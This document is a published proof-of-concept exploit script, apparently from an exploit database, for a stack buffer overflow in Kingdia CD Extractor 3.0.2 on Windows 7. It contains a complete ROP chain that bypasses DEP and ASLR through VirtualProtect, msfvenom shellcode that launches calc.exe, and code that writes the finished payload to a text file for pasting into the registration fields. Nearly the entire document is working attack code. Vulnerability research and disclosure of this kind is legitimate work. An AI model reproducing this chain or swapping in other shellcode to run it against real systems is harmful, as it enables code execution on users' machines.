# Exploit Title: Kingdia CD Extractor v3.0.2 (DEP + ASLR Bypass)
# Date: 28/07/2022
# Exploit Author: Angelo Frasca Caccia
# Software Link: https://en.softonic.com/download/kingdia-cd-extractor/windows/post-download
# Version: 3.0.2
# Tested on: Windows 7 Professional 64 bit Service Pack 1

# NOTES ABOUT THE EXPLOIT CODE
#------------------------------
# Kingdia CD Extractor 3.0.2 is vulnerable to a stack-based buffer overflow.
# The condition can be triggered when sending a large input string as registration code.
# This exploit generates a "payload.txt". Just launch the application and press the registration
# button. Then copy the content of the generated .txt file and paste it into the 'User Name' and 
# 'Registration code' fields.

# NOTES ABOUT THE ROP CHAIN
#---------------------------
# This rop chain was developed with VirtualProtect. The vulnerable application come with two
# modules (SkinMagic.dll and in_mad.dll) which do not support Address Space Layout Randomization
# nor are they rebased.

#-----------------------------------------------START---------------------------------------------#

import struct
import time


def generate_rop():

    gadgets = [

        # padding
        0x1003A015, # RETN --> SkinMagic.dll
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,

        # setting EDX register --> 0x40 (PAGE EXECUTE_READWRITE)
        0x1003a014, # POP ECX # RETN
        0x10021AB6, # random address in skinmagic.dll --> ecx has to point to a valid memory address, otherwise the second instruction of the next gadget will likely fail
        0x1003176a, # XOR EDX,EDX # CMP EAX,DWORD PTR DS:[ECX+8] # SETG DL # MOV EAX,EDX # RETN
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141, # compensate the first pop instruction
        0x41414141, # compensate the second pop instruction
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,


        # setting EBX register --> dwSize (0x301)
        0x1002e38c, # POP EAX # RETN
        0xFFFFFCFF, # 0x301 to negate
        0x1001f629, # NEG EAX # RETN
        0x601ccfd1, # XCHG EAX,EBX # RETN

        # setting ECX register --> lpOldProtect
        0x1003a568, # POP ECX # RETN
        0x1004982b, # writable location in SkinMagic.dll

        # setting EDI register --> RETN
        0x601de1c9, # POP EDI # RETN
        0x1003A015, # gadget to RETN

        # setting EBP register --> POP EBP
        0x10028019, # POP EBP # RETN
        0x10028019,

        # setting ESI register --> ptr to JMP [EAX]
        0x1002e38c, # POP EAX # RETN
        0x1003b268, # ptr &VirtualProtect
        0x100369a1, # MOV EAX,DWORD PTR DS:[EAX] # RETN
        0x601d108f, # XCHG EAX,ESI # RETN

        # setting EAX register --> &VirtualProtect
        0x1002e38c, # POP EAX # RETN
        0x1003b268, # ptr &VirtualProtect

        # finalizing the chain with PUSHAD # RETN + JMP ESP
        0x601c88c0, # pushad # retn
        0x601C9D6B, # jmp esp


        ]

    chain = []
    for gadget in gadgets:
        chain.append(struct.pack("<I", gadget))
    return "".join(chain)


def main():

    shellcode =  b""
    shellcode += b"\xbe\xb0\xe7\xa7\xc5\xdb\xd4\xd9\x74\x24\xf4\x5a\x33"
    shellcode += b"\xc9\xb1\x31\x31\x72\x13\x83\xea\xfc\x03\x72\xbf\x05"
    shellcode += b"\x52\x39\x57\x4b\x9d\xc2\xa7\x2c\x17\x27\x96\x6c\x43"
    shellcode += b"\x23\x88\x5c\x07\x61\x24\x16\x45\x92\xbf\x5a\x42\x95"
    shellcode += b"\x08\xd0\xb4\x98\x89\x49\x84\xbb\x09\x90\xd9\x1b\x30"
    shellcode += b"\x5b\x2c\x5d\x75\x86\xdd\x0f\x2e\xcc\x70\xa0\x5b\x98"
    shellcode += b"\x48\x4b\x17\x0c\xc9\xa8\xef\x2f\xf8\x7e\x64\x76\xda"
    shellcode += b"\x81\xa9\x02\x53\x9a\xae\x2f\x2d\x11\x04\xdb\xac\xf3"
    shellcode += b"\x55\x24\x02\x3a\x5a\xd7\x5a\x7a\x5c\x08\x29\x72\x9f"
    shellcode += b"\xb5\x2a\x41\xe2\x61\xbe\x52\x44\xe1\x18\xbf\x75\x26"
    shellcode += b"\xfe\x34\x79\x83\x74\x12\x9d\x12\x58\x28\x99\x9f\x5f"
    shellcode += b"\xff\x28\xdb\x7b\xdb\x71\xbf\xe2\x7a\xdf\x6e\x1a\x9c"
    shellcode += b"\x80\xcf\xbe\xd6\x2c\x1b\xb3\xb4\x3a\xda\x41\xc3\x08"
    shellcode += b"\xdc\x59\xcc\x3c\xb5\x68\x47\xd3\xc2\x74\x82\x90\x3d"
    shellcode += b"\x3f\x8f\xb0\xd5\xe6\x45\x81\xbb\x18\xb0\xc5\xc5\x9a"
    shellcode += b"\x31\xb5\x31\x82\x33\xb0\x7e\x04\xaf\xc8\xef\xe1\xcf"
    shellcode += b"\x7f\x0f\x20\xac\x1e\x83\xa8\x1d\x85\x23\x4a\x62"
    # msfvenom -p windows/exec cmd=calc.exe -a x86 -b "\x00\x0a\x0d" -f python
    # bad characters: \x00\x0a\x0d

    rop_chain = generate_rop()
    
    payload = "A"*268
    payload += struct.pack("<I", 0x1003A015)    # RETN --> SkinMagic.dll 
    payload += rop_chain
    payload += "\x90"*8
    payload += shellcode

    print "[+] Dropping payload.txt..."
    time.sleep(1)
    f = open("payload.txt", "w")
    f.write(payload)
    f.close()


if __name__ == "__main__":
    main()
  
#-----------------------------------------------END---------------------------------------------#
